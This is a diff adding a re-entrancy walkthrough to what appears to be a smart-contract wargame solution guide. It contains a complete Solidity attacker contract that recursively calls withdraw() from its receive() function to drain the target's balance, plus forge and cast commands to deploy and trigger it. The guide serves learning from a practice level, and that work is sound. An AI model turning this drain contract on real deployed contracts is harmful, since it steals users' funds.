@@ -259,3 +259,53 @@ forge create src/level09.sol:UltimateKing --constructor-args $LEVEL_ADDRESS --va
 ```
 
 6. submit the instance, u're done.
+
+## level10 - Re-entrancy
+
+1. Main cause of a re-entrancy attack is implementing ether transfer before deducting the balance. As we can see in the withdraw() function ether transfer is happening before reducing the balance of sender. An attacker can easily reenter back by recursively calling the vulnerable function.
+
+2. so what we're going to do is create a contract, smthg like this
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "../instances/Ilevel10.sol";
+
+contract POCReentrance {
+    Reentrance reentrance;
+    uint256 amount = 0.001 ether;
+
+    constructor(address payable _reentrance) {
+        reentrance = Reentrance(_reentrance);
+    }
+
+    function attack() public payable {
+        reentrance.donate{value: msg.value}(address(this));
+        reentrance.withdraw(amount);
+    }
+
+    receive() external payable {
+        if (address(reentrance).balance > 0) {
+            reentrance.withdraw(amount);
+        }
+    }
+}
+```
+
+3. Deploy it and give level address
+
+```
+forge create src/level10.sol:POCReentrance --constructor-args $LEVEL_ADDRESS --rpc-url $RPC_URL --private-key $PKEY
+```
+
+4. then we will call our attack() function with value 0.001 ether which will first call the donate() function as it is required to have balance greater or equal to the amount passed at the time of withdrawal.
+
+5. after donate, attack() will call withdraw function. We will create a receive() function in our contract so when the withdraw() function tries to send us Ether, we can reenter back into the function by calling it again , this will keep on repeating until the other contract is drained and "balances[msg.sender] -= \_amount;" will never execute.
+
+```
+cast send $DEPLOYED_ADDRESS "attack()" --value 0.001ether --rpc-url $RPC_URL --private-key $PKEY
+```
+
+6. once it's done u can submit the instance.
